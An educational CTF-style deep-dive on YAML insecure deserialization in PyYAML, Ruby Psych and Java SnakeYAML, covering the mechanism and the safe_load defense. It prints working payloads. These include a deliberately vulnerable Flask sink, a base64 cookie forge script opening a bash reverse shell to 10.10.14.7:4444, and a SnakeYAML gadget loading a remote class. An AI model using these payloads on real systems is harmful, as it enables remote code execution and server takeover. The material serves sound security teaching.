---
title: YAML Deserialization (Insecure Deserialization)
date: 2026-08-22T00:00:00.000Z
summary: >-
  Why loading a YAML file can hand an attacker remote code execution — the
  mechanism, then exploitation in Python, Ruby and Java.
tags:
  - deserialization
  - rce
  - web
draft: false
featured: false
source: explanations/yaml-deserialization.md
topic: web
kind: deep-dive
---
# YAML Deserialization (Insecure Deserialization)

> **Scope:** what it is, *why* loading a YAML file can give you code execution (RCE), how it's exploited in Web CTFs, with payloads for Python (`yaml.load`), Ruby and Java. Covers the mechanism and offensive exploitation; does not go deep into every parser of every language.
> **Prerequisites:** know what an HTTP request is, have a rough idea of Python/Ruby code, and know the word **RCE** (Remote Code Execution = running *your* command on *their* server).

---


## 1. The Simple Version

To answer you, a program keeps things in memory: objects. An "object" is a box with a name and contents (a user, a cart, a config…). It lives in RAM and disappears when the program shuts down.

To **save** that box to a file or **send** it over the network, you have to flatten it into text. Turning box → text is called **serializing**. Turning text → box again is **deserializing**. YAML is just one of the possible text formats (like JSON, but with line breaks and indentation, more readable for a human).

Here's the trap: some tools that read YAML don't just rebuild data. They also accept instructions like *"to rebuild this box, call this function of the program with these arguments."* If **you**, the attacker, can supply the YAML, you can write in the file: *"to rebuild this, run the system command `id`."* The server reads your "harmless" YAML… and runs your command.

So the bug is not in YAML itself. The bug is that the server trusts text coming from the outside and lets that text **choose which code to run**.

**The analogy:** picture an administrative form where you normally fill in "Name: Taha, City: Rabat". The office reads it and files it. Now imagine the form also accepts a magic box: "Special instruction for the clerk to carry out." An attacker writes in it "Open the safe and hand me the cash." A naive clerk, trained to *obey whatever the form says*, does it. The form (YAML) isn't guilty; it's the clerk blindly obeying an order from a stranger.

**In one sentence:** deserializing untrusted YAML with a "powerful" parser means letting a stranger choose which code your server executes.

---

## 2. The Professional Explanation

### 2.1 Definition

**Insecure deserialization** is a vulnerability where an application rebuilds objects from attacker-controlled data, using a deserializer capable of **instantiating arbitrary types** or **invoking constructors / callbacks** during the rebuild. **YAML deserialization** is the special case where the input format is YAML and the parser supports *tags* that map to native objects of the language (`!!python/object`, `!ruby/object`, Java `!!` tags via SnakeYAML, etc.). Typical result: **RCE**.

### 2.2 How it actually works

YAML defines **tags** (prefixed `!` or `!!`) that tell the parser *which type* to build for a node. A "safe" parser ignores dangerous tags and only produces base types (dict, list, str, int, bool). A "full/unsafe" parser honors tags that point at application code or standard-library code.

The flow of an exploitation:

1. **Entry point.** The app reads attacker input (HTTP body, cookie, header, form field, uploaded `.yml` file, config parameter) and passes it to a YAML parser.
2. **Dangerous function.** The code calls a variant that builds arbitrary objects: in Python `yaml.load(data)` with no safe `Loader=` (historically the default), or `yaml.unsafe_load` / `yaml.full_load`; in Ruby `YAML.load` (Psych) on untrusted data; in Java `new Yaml().load(...)` from SnakeYAML.
3. **Gadget.** The payload references a **gadget**: a piece of code *already present* (stdlib or dependencies) which, when instantiated or when its rebuild method is called, produces a useful effect — run a command, read a file, make a network request. You don't "upload code," you **hijack existing code**.
4. **Trigger.** During deserialization, the parser calls the gadget's constructor / factory / callback with **your** arguments. The code runs on the server side.

Why it's built this way: YAML was also designed as a **rich configuration** format and an **object-persistence** format (save/reload a program's state). To reload a full object, the parser must be able to *rebuild any type*. That power is legitimate for trusted internal data — and catastrophic the moment a single byte comes from outside.

The real key concept: **deserializing ≠ parsing data**. A powerful deserializer is an **interpreter** in disguise. Feeding it attacker input is the same as feeding it code.

### 2.3 Key terms

| Term | Meaning |
|---|---|
| Serialize / Deserialize | Object → text/bytes, then text → object |
| Safe parser | Produces only base types; ignores dangerous tags (`yaml.safe_load`) |
| Full/unsafe parser | Instantiates arbitrary types (`yaml.load`, `unsafe_load`, `full_load`) |
| YAML tag | `!` / `!!` annotation saying which type to build (`!!python/object/apply:os.system`) |
| Gadget | Code already present, hijacked to produce the wanted effect (RCE, LFI, SSRF) |
| Gadget chain | Chaining several gadgets to go from deserialization to RCE |
| RCE | Remote Code Execution — running a command on the target machine |
| Sink | The vulnerable line of code that receives the input (`yaml.load(user_input)`) |

### 2.4 Variants / types

| Ecosystem | Dangerous function | Payload marker | Safe alternative |
|---|---|---|---|
| **Python (PyYAML)** | `yaml.load()` (no loader), `yaml.unsafe_load()`, `yaml.full_load()` | `!!python/object/apply:`, `!!python/object/new:` | `yaml.safe_load()` |
| **Ruby (Psych)** | `YAML.load` on external data | `!ruby/object:`, `!ruby/hash:` | `YAML.safe_load` |
| **Java (SnakeYAML)** | `new Yaml().load(...)` by default | `!!javax.script...`, `!!com.sun...`, `ScriptEngine` | `new Yaml(new SafeConstructor())` |
| **PHP (Symfony YAML)** | Formerly `Yaml::parse` with `PARSE_OBJECT` | `!php/object` | don't enable the object flag |

> Important note for recent PyYAML: since PyYAML 5.1, `yaml.load(x)` **without** a `Loader` argument emits a warning and behaves more carefully; CTFs exploit either older versions, or an explicit call to `unsafe_load` / `full_load`, or `Loader=yaml.Loader`. `full_load` blocks `apply`/`new` but can still be exploitable via other gadgets; `unsafe_load` is fully vulnerable.

### 2.5 Trade-offs and limits (attacker side)

- **Good when:** you control an input that ends up in an unsafe YAML parser, and an RCE gadget exists in the version present. It's often a direct RCE, very high value.
- **Blocked when:** the app uses `safe_load` (or `SafeConstructor`) → you only get inert data, no execution. Or the parser version has been patched to forbid the gadget you're aiming at.
- **Trap:** even with a "moderately safe" parser (`full_load`), some gadgets still work. "Safe" is only true for the real safe function. Don't conclude too fast that it's blocked: switch gadget before giving up.

---

## 3. Examples

### Example 1 — Basic (Python / PyYAML)

Minimal vulnerable server:

```python
# app.py
import yaml
from flask import Flask, request
app = Flask(__name__)

@app.route("/load", methods=["POST"])
def load():
    data = request.get_data()          # attacker-controlled bytes
    obj = yaml.unsafe_load(data)       # ← vulnerable SINK
    return f"loaded: {obj}"
```

Payload sent in the body:

```yaml
!!python/object/apply:os.system
- "id"
```

Sending it with curl:

```bash
curl -X POST http://target:5000/load --data-binary $'!!python/object/apply:os.system\n- "id"'
```

**What happens, line by line:**
1. The tag `!!python/object/apply:os.system` tells the parser: "for this node, **call** `os.system`".
2. The list `- "id"` supplies the arguments: `os.system("id")`.
3. During `unsafe_load`, PyYAML actually runs `os.system("id")` → the command `id` runs on the server.
4. You have RCE. Swap `"id"` for a reverse shell to get a real shell.

To exfiltrate the flag directly (quieter than `os.system`, which prints nothing back):

```yaml
!!python/object/apply:subprocess.check_output
- ["cat", "flag.txt"]
```

`subprocess.check_output` **returns** the output, so the flag can reappear in the HTTP response depending on how the app prints `obj`.

### Example 2 — Realistic (reverse shell via a YAML cookie)

Common CTF setup: the app stores a serialized session as YAML in a cookie, base64-decoded.

```python
import yaml, base64
cookie = request.cookies.get("session")
state = yaml.unsafe_load(base64.b64decode(cookie))   # ← sink
```

Building the attacker payload:

```python
# forge.py  (run on YOUR machine)
import base64
payload = (
    '!!python/object/apply:os.system\n'
    '- "bash -c \'bash -i >& /dev/tcp/10.10.14.7/4444 0>&1\'"\n'
)
print(base64.b64encode(payload.encode()).decode())
```

Steps:
1. On your machine: `nc -lvnp 4444` (listen).
2. `python3 forge.py` → you get the base64 value.
3. Replace your `session` cookie with that value (DevTools or `curl -b "session=..."`).
4. Reload the page. The server decodes, `unsafe_load` runs the command, your shell lands on port 4444.

### Example 3 — Edge case / trap (SnakeYAML in Java, RCE without `apply`)

In Java there's no `os.system` tag. The classic SnakeYAML gadget instantiates an object that, **on construction**, fetches a remote class and runs it:

```yaml
!!javax.script.ScriptEngineManager [
  !!java.net.URLClassLoader [[
    !!java.net.URL ["http://10.10.14.7:8000/"]
  ]]
]
```

**Why this breaks a beginner's mental model:**
- There's **no command** visible in the payload — no `id`, no `cat`. You wrongly assume "no function call = no RCE."
- In reality, `ScriptEngineManager` **loads services** from the classpath at construction time. By handing it a `URLClassLoader` pointing at **your** HTTP server, you force it to download and instantiate **your** malicious class (packaged in a JAR with a `META-INF/services/...` file).
- Execution comes from a **side effect of a constructor**, not an explicit call. That's the whole idea of a gadget: the harm happens *during* the object's rebuild, not after.

Transferable lesson: when you don't see a "function to call," look for a **type whose mere construction triggers an action** (class loading, network connection, file read).

---

## 4. Common Mistakes

| Mistake | Why it happens | Correct approach |
|---|---|---|
| Believing the bug is "in YAML" | Confusing the format with the parser | The format is inert; it's the **deserialization function** that executes |
| Trying `!!python/object/apply` and giving up when it fails | The target uses `full_load` (blocks `apply`/`new`) or a patched version | Switch gadget, check the version, try `subprocess` vs `os.system`, or other modules |
| Using `os.system` and seeing nothing | `os.system` returns an exit code, **not** the text output | Use `subprocess.check_output` if you want to read the result in the response |
| Payload with wrong indentation / wrong argument type | YAML is indentation-sensitive; `apply` expects a **list** of arguments | Keep `- "arg"` under the tag; test the payload locally first |
| Forgetting the encoding | The input goes through base64 / URL-encoding before the parser | Reproduce the app's pipeline **exactly** (b64, gzip…) before sending |
| Defense side: switching to `full_load` thinking it's safe | `full_load` is still exploitable via some gadgets | Use **`safe_load`** (Python) / `SafeConstructor` (Java) / `safe_load` (Ruby) |

---

## 5. Summary

**The core idea:** a powerful YAML deserializer isn't a data reader, it's an interpreter that can **build any type** and **call code** during the rebuild. Feeding it attacker-controlled input is the same as feeding it a program to run. The fix isn't to "sanitize the YAML" but to use the **safe** function that refuses to build anything beyond base data.

**Cheat sheet:**

| Question | Answer |
|---|---|
| What is it? | An RCE obtained by making the app deserialize malicious YAML |
| Why does it exist? | "Full" YAML parsers can rebuild arbitrary objects → they execute code |
| When do I use it (CTF)? | Whenever attacker input (body, cookie, `.yml` upload) lands in `yaml.load`/`unsafe_load`/SnakeYAML |
| When do I avoid it / it's blocked? | `safe_load` / `SafeConstructor` → only inert data, no execution |
| Biggest gotcha? | Thinking "no visible command" = no RCE (see the Java construction gadget) |

**Test yourself:**
1. What's the difference between `yaml.load` and `yaml.safe_load` in Python?
2. In `!!python/object/apply:os.system` followed by `- "id"`, what is the list `- "id"` for?
3. Why prefer `subprocess.check_output` over `os.system` to read a flag?
4. Is the bug in the YAML format or somewhere else? Where exactly?
5. In the SnakeYAML payload, where and when does the malicious code run, even though no command is written?

<details>
<summary>Answers</summary>

1. `yaml.load` (historically, or `unsafe_load`) can **instantiate arbitrary types and call code**; `safe_load` produces only base types (dict, list, str, int, bool) and ignores dangerous tags → no RCE.
2. It's the **argument list** passed to the function: the parser runs `os.system("id")`.
3. `os.system` only returns the **exit code** and displays nothing usable in the response; `subprocess.check_output` **returns the command's text output**, so the flag can reappear in the HTTP response.
4. Not in the format (inert). In the app's **deserialization function** (the *sink*, e.g. `yaml.unsafe_load(user_input)`), which trusts external input and lets it choose the code to run.
5. During the **construction** of the `ScriptEngineManager` object: its constructor loads services via the `URLClassLoader` pointed at the attacker's server, downloads and instantiates the class → execution is a **side effect of the constructor**, not an explicit call.

</details>

**Go deeper:**
- PyYAML docs on `load` vs `safe_load` (the post-5.1 warnings).
- OWASP — "Deserialization Cheat Sheet" and A08:2021 *Software and Data Integrity Failures*.
- `ysoserial` (Java) and the SnakeYAML `ScriptEngineManager` gadget for building the chains.
- HackTricks — "Python Yaml Deserialization" page (list of `apply`/`new` gadgets).
- File it in your vault: create `CTF/03-Reflexes/Reflexe-Web-Deserialisation-YAML.md` modeled on `Reflexe-Web-LFI-et-Upload.md`, tagged `#technique/deserialization`.
